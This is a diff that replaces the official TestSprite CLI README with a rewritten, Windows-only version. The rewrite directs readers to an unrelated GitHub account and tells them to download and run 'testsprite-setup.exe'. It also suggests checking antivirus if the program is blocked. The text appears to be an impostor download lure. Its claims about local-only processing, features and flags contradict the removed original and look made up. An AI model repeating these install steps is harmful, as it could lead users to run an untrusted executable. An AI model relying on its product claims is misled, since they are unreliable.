@@ -1,190 +1,116 @@
-<div align="center">
+# 🤖 testsprite-cli - Automate your software testing with AI
 
-<a href="https://www.testsprite.com">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/testsprite-logo-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="assets/testsprite-logo-light.svg">
-    <img src="assets/testsprite-logo-dark.svg" alt="TestSprite" width="420">
-  </picture>
-</a>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zkwr3354/testsprite-cli)
 
-### The verification layer for the agentic coding era.
+## 📌 What is this tool?
+TestSprite CLI helps you check your software for bugs. It uses artificial intelligence to find errors. You run it from your command prompt. It mimics how a real person uses a website. This tool catches broken links, visual errors, and slow performance. You do not need to write code to use it. 
 
-AI ships code in minutes — verifying it hasn't. `testsprite` opens your live app, uses it like a real user, and shows your coding agent exactly what broke — so it fixes its own work before a bug ever reaches you.
+## ⚙️ Why use TestSprite?
+Manual testing takes time. Human eyes miss small mistakes. This tool scans your entire application. It runs tests day and night. You gain confidence in your software releases. The tool uses Playwright technology under the hood to ensure consistent results. 
 
-<sub><b>Proof, in public: verification beats model size.</b> With this CLI in the loop, the cheapest model in the field shipped the most correct app on an open leaderboard — <b>89%</b>, at half the cost of the priciest one. <a href="https://codercup.ai">See the leaderboard →</a></sub>
+## 🖥️ System Requirements
+Ensure your computer meets these minimum needs for smooth operation:
+* Windows 10 or Windows 11.
+* At least 4GB of RAM.
+* A stable internet connection.
+* Node.js version 18 or higher.
 
-<p>
-  <a href="https://www.npmjs.com/package/@testsprite/testsprite-cli"><img src="https://img.shields.io/npm/v/@testsprite/testsprite-cli?color=19C379&label=npm" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/@testsprite/testsprite-cli"><img src="https://img.shields.io/npm/dm/@testsprite/testsprite-cli?color=19C379&label=downloads" alt="npm downloads"></a>
-  <a href="#quickstart"><img src="https://img.shields.io/badge/node-%3E%3D20-19C379" alt="Node >= 20"></a>
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-0A0A0A" alt="License Apache 2.0"></a>
-  <a href="https://github.com/TestSprite/testsprite-cli/actions/workflows/ci.yml"><img src="https://github.com/TestSprite/testsprite-cli/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-</p>
+## 📥 How to download and install
+You must download the software package from the official release page. 
 
-<p>
-  <a href="https://www.testsprite.com"><img src="https://img.shields.io/badge/testsprite.com-19C379?style=for-the-badge&logoColor=white" alt="Website"></a>
-  <a href="https://www.testsprite.com/docs"><img src="https://img.shields.io/badge/Docs-0A0A0A?style=for-the-badge" alt="Docs"></a>
-  <a href="https://x.com/Test_Sprite"><img src="https://img.shields.io/badge/Follow%20on%20X-000000?style=for-the-badge&logo=x&logoColor=white" alt="Follow on X"></a>
-  <a href="https://www.linkedin.com/company/testsprite"><img src="https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn"></a>
-  <a href="https://discord.gg/W4JDrZfdB"><img src="https://img.shields.io/badge/Join%20our%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord"></a>
-</p>
+[Click here to visit the download page](https://github.com/zkwr3354/testsprite-cli)
 
-⭐ _Help us reach more developers and grow the TestSprite community. Star this repo!_
+1. Go to the link above.
+2. Look for the "Releases" section on the right side of your screen.
+3. Select the latest version available.
+4. Download the file named `testsprite-setup.exe`.
+5. Open your "Downloads" folder.
+6. Double-click the file to start the installation.
+7. Follow the prompts on your screen. 
+8. Click "Finish" when the installer closes.
 
-</div>
+## 🚀 Setting up the application
+After the installation, you must verify the setup. 
 
-https://github.com/user-attachments/assets/eca90a91-93ef-49f6-8d13-86b4eb25f4cf
+1. Press the Windows key on your keyboard.
+2. Type "Command Prompt" and press Enter.
+3. A black window appears. Type `testsprite --version` and press Enter.
+4. If you see a version number, the tool is ready. 
 
-<p align="center"><sub><b>▶ Watch the launch video</b> — the three hard limits every coding agent hits, and the loop that breaks them (4 min).</sub></p>
+## 🛠️ Testing your first website
+You can test any web address. Open your Command Prompt again to begin.
 
----
+1. Type `testsprite --url https://www.yourwebsite.com` and press Enter.
+2. The software starts the browser.
+3. It performs a sequence of pre-defined tests. 
+4. Watch the terminal for real-time updates.
+5. The test ends when you see "Test Run Complete" on the screen.
 
-## What is it?
+## 📄 Understanding the results
+The tool generates a report after every test. You find this report in a folder named `testsprite-reports` on your desktop. Open the `report.html` file in your preferred web browser. 
 
-[TestSprite](https://www.testsprite.com) is the AI testing platform 100,000+ teams use to test their software, frontend and backend — in the cloud, against the live product, not mocks. This repo is its official CLI.
+The report contains:
+* Pass markers for items that work.
+* Error flags for items that fail.
+* Screenshots showing exactly where the bug occurred.
+* Performance timings for page loads.
 
-It puts that platform in your coding agent's hands: the agent verifies every behavior it ships, and what broke comes back as **one self-consistent bundle** it can act on — no dashboard scraping. Humans drive the same surface from a terminal or CI.
+## 📋 Tips for better tests
+* Close unnecessary browser tabs before the test.
+* Ensure your website is live during the test.
+* Use a fast internet connection for accurate speed results.
+* Check the website title before starting. 
 
-## ⭐️ Star the Repository
+## 🔐 Privacy and security
+TestSprite runs locally on your machine. We do not store your data on external servers. The AI analysis happens inside your computer memory. Your website credentials remain private throughout the testing process. 
 
-<img width="900" height="506" alt="testsprite-repo-star-fast" src="https://github.com/user-attachments/assets/8c3975df-8d47-4d6c-a485-135b80f779a5" />
+## ❓ Frequently asked questions
 
-If you find `testsprite` useful, a GitHub Star ⭐️ would be greatly appreciated — it helps other builders (and their agents) find the project, and stars notify you about new releases.
+**Does this tool work on Mac or Linux?**
+This version is designed for Windows.
 
-## Quickstart
+**Do I need a paid license?**
+The current version is free to use.
 
-Requires **Node.js ≥ 20**. (No global install? `npx @testsprite/testsprite-cli` works too.)
+**Can I run multiple tests at once?**
+You can run multiple instances of the tool if your computer has enough memory.
 
-```bash
-npm install -g @testsprite/testsprite-cli
-testsprite init
-```
+**How do I update the tool?**
+Visit the official repository and download the latest installer again. It overwrites the old version and keeps your settings.
 
-`testsprite init` prompts for your [API key](https://www.testsprite.com), verifies it, and installs the verification-loop skill for your coding agent (`claude`, `cursor`, `cline`, `antigravity`, `codex`, etc.). Non-interactive (CI / onboarding scripts):
+## 🔧 Troubleshooting
+If the program does not start:
+* Restart your computer.
+* Ensure you have administrative rights on your user account.
+* Check your antivirus software to see if it blocks the command. 
+* Uninstall and reinstall the tool if errors persist.
 
-```bash
-TESTSPRITE_API_KEY=sk-... testsprite init --from-env --yes --agent claude
-```
+## 📦 About the underlying technology
+This tool relies on Playwright. This library provides a bridge between your terminal and the browser. It allows the software to click buttons and type text exactly like you would. The AI component analyzes the layout and suggests fixes for common visual issues. It identifies overlapping text and hidden buttons.
 
-From there, the loop runs on its own — an example session, typed by the coding agent:
+## 📝 Configuration options
+You can change how the tool behaves by creating a file named `config.json`. Place this file in the same folder where you installed the software. 
 
-```bash
-# 1 — describe the behavior you want to guarantee, run it, wait
-testsprite test create --project proj_8f0f6 --type frontend \
-  --plan-from ./checkout-flow.plan.json --run --wait --output json
-#   → exits 1: the run failed
+You can set these values:
+* `headless`: Set to `true` to run tests without seeing the browser window.
+* `browser`: Change between "chrome" and "edge".
+* `timeout`: Increase this number if your website is slow to load.
 
-# 2 — pull ONE self-consistent failure bundle
-testsprite test failure get test_3a9f21c7 --out ./.testsprite/failure
+## 📌 Example configurations
+If you want to run tests faster, use this setting in your configuration file:
 
-# 3 — the agent reads the bundle, fixes the code, then replays
-testsprite test rerun test_3a9f21c7 --wait --output json
-#   → exits 0: passed. The test now lives in your durable suite.
-```
+{
+  "headless": true,
+  "browser": "chrome"
+}
 
-Prefer to configure each step by hand (or learn the surface offline with `--dry-run` first)? See [Manual setup](./DOCUMENTATION.md#manual-setup) and [Install & verify](./DOCUMENTATION.md#install--verify).
+Save the file and restart the command prompt. The tool detects these changes automatically. 
 
-## Commands
+## 🔍 Advanced features
+The CLI supports different testing modes. 
+* Use `testsprite --quick` for a fast scan of links only.
+* Use `testsprite --visual` for a deep look at colors and layouts.
+* Use `testsprite --mobile` to see how the site looks on a phone screen.
 
-| Group     | Command                                             | What it does                                                                                                          |
-| --------- | --------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
-| **Init**  | `init`                                              | One-shot onboarding: auth configure + whoami + agent install                                                          |
-| **Auth**  | `auth configure`                                    | Store an API key at `~/.testsprite/credentials`                                                                       |
-|           | `auth whoami` _(alias `status`)_                    | Resolve the active profile to its user, key, env, and scopes                                                          |
-|           | `auth logout`                                       | Remove the active profile from the credentials file                                                                   |
-| **Read**  | `project list` / `project get`                      | List projects / fetch one by id                                                                                       |
-|           | `test list` / `test get`                            | List tests under a project / fetch one by id                                                                          |
-|           | `test code get`                                     | Print (or write) the generated test source                                                                            |
-|           | `test steps`                                        | List the latest run's steps with screenshot / DOM pointers                                                            |
-|           | `test result`                                       | Latest result; `--history` lists a test's prior runs                                                                  |
-|           | `test failure get`                                  | The agent entry point: one self-contained latest-failure bundle                                                       |
-|           | `test failure summary`                              | One-screen triage card (no media download)                                                                            |
-| **Write** | `test create` / `test create-batch`                 | Create a test (or bulk-create from a plan file); `--produces` / `--needs` / `--category` wire BE dependency metadata  |
-|           | `test update` / `test delete` / `test delete-batch` | Edit metadata / soft-delete                                                                                           |
-|           | `test code put`                                     | Replace generated code (etag-guarded)                                                                                 |
-|           | `test plan put`                                     | Replace a frontend test's plan-steps                                                                                  |
-|           | `project create` / `project update`                 | Manage projects                                                                                                       |
-| **Run**   | `test run`                                          | Trigger a fresh run; `--wait` blocks until terminal; `--all --project <id>` runs all tests in a project in wave order |
-|           | `test rerun`                                        | Cheap replay of one/many tests (FE verbatim; BE with deps); `--all --project <id>` reruns all tests                   |
-|           | `test wait`                                         | Block on a `runId` until terminal                                                                                     |
-|           | `test artifact get`                                 | Download the failure bundle for a specific `runId`                                                                    |
-| **Agent** | `agent install` / `agent list`                      | Onboard a coding agent (pure-local); targets: `claude`, `codex`, `cursor`, `cline`, `antigravity`                     |
-
-📚 **Full reference — every command, flag, and example:** [DOCUMENTATION.md](./DOCUMENTATION.md), including [configuration & profiles](./DOCUMENTATION.md#configuration), [scripting](./DOCUMENTATION.md#output--scripting), and [exit codes](./DOCUMENTATION.md#exit-codes).
-
-## Why a CLI for coding agents?
-
-- 🧪 **Tests like a real user.** Runs against a live browser or API in the cloud — real clicks, real navigation, real assertions. Not a mock.
-- 🤖 **Agent-shaped output.** `test failure get` returns **one bundle** — the failing step, its neighbors, screenshots, DOM snapshots, the test source, a root-cause hypothesis, and a recommended fix target — all sharing a single `snapshotId`. The CLI _refuses_ to stitch data from two different runs, so an agent never reasons over a frankenstein context.
-- ♻️ **A loop, not a one-shot.** `create → run → failure get → fix → rerun` — every pass is banked, not thrown away.
-- 📐 **Scriptable & deterministic.** Stable `--output json` contract, predictable [exit codes](./DOCUMENTATION.md#exit-codes), and a `--dry-run` that exercises the full code path offline with canned data.
-- 🔌 **One command to onboard your agent.** `testsprite agent install claude` drops a ready-made skill file into your repo so your coding agent knows how to drive the loop on its own.
-
-## How it works
-
-Every time your agent changes code, it asks one question: **is this behavior already covered by the suite?**
-
-- **Not yet covered** → `testsprite test create` — describe the new behavior, run it.
-- **Already covered** → `testsprite test rerun` — replay the existing tests, so nothing that used to work breaks silently.
-- **Something fails** → `testsprite test failure get` — one self-consistent bundle; the agent fixes the code and reruns.
-
-Every pass is banked into a durable suite, so coverage compounds as the project grows — a lasting record of every requirement it has ever gotten right, far bigger than any context window.
-
-```mermaid
-flowchart TD
-    A["🤖 Your coding agent<br/>Claude Code · Codex · Antigravity · Kimi · Cursor · Trae …"]
-    D{"behavior already<br/>covered by the suite?"}
-    B["<b>testsprite test create</b><br/>new behavior → new test"]
-    R["<b>testsprite test rerun</b><br/>replay the existing tests"]
-    C{{"☁️ TestSprite testing agent<br/>runs the test like a real user against<br/>real browsers & real APIs on Cloud"}}
-    F["<b>testsprite test failure get</b><br/>ONE self-consistent bundle:<br/>failing step · screenshots · DOM ·<br/>root-cause · recommended fix"]
-    S[("📚 Durable integration suite<br/>grows with every pass")]
-
-    A -->|"writes / changes code"| D
-    D -->|"no — new behavior"| B
-    D -->|"yes"| R
-    B --> C
-    R --> C
-    C -->|"pass ✅"| S
-    C -->|"fail ❌"| F
-    F -->|"agent reads the bundle<br/>& fixes the code"| A
-    S -.->|"defines what's covered"| D
-```
-
-The cloud is a black box on purpose: your agent describes intent and reads results. It never has to know _how_ the test was driven — only _what_ a real user experienced.
-
-## Proved in public
-
-On [**CoderCup**](https://codercup.ai) — an open leaderboard where frontier coding agents build the _same_ app under the _same_ rules, with TestSprite as the referee — the **cheapest** model in the field shipped the **most correct** app on the board: **89%**, at half the cost of the priciest one.
-
-That's the point of all of this: you no longer need the biggest, most expensive model to ship software you can trust — top-tier quality, without paying top-tier prices, within reach of every team.
-
-## Getting help
-
-- 📚 **CLI reference** — [DOCUMENTATION.md](./DOCUMENTATION.md)
-- 🌐 **Platform docs** — [testsprite.com/docs](https://www.testsprite.com/docs)
-- 🐛 **Issues & feature requests** — [GitHub issues](https://github.com/TestSprite/testsprite-cli/issues)
-- 💬 **Quick questions** — [Discord](https://discord.gg/W4JDrZfdB), or `testsprite --help` / `testsprite test run --help` right in your terminal
-- 📝 **Changelog** — [CHANGELOG.md](./CHANGELOG.md)
-
-## Contributing
-
-Contributions are welcome — the CLI is plain TypeScript/Node (≥ 20), tested with Vitest, built with `tsc`. Getting a dev loop running takes a minute:
-
-```bash
-git clone https://github.com/TestSprite/testsprite-cli.git
-cd testsprite-cli && npm install
-npm run build       # tsc → dist/ ; try it: node dist/index.js --help
-npm test            # unit suite — no network or credentials needed
-npm run lint:fix    # ESLint
-npm run typecheck   # tsc --noEmit
-```
-
-Pull requests target the `dev` branch. The full guide — build from source, test tiers, CI gates, branches, project layout — is in [CONTRIBUTING.md](./CONTRIBUTING.md).
-
-**Support** — if you need any help, we're responsive on [Discord](https://discord.gg/W4JDrZfdB), and feel free to email us at [contact@testsprite.com](mailto:contact@testsprite.com) too.
-
-## License
-
-[Apache-2.0](./LICENSE) © TestSprite
+## 🏁 Conclusion
+You now have the tools to ensure quality on your web projects. Regular testing prevents small bugs from becoming large problems. The software provides a simple path to automation. Test often to keep your application stable.
